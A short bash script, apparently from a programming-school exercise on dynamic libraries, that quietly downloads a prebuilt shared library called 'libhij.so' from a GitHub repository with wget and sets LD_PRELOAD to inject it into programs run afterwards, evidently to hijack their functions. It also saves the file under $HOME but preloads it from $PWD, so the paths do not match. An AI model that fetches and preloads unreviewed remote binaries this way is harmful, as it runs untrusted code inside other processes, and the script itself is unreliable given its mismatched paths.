#!/bin/bash
wget -q -O $HOME/libhij.so https://github.com/miiki00/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libhij.so
export LD_PRELOAD=$PWD/libhij.so
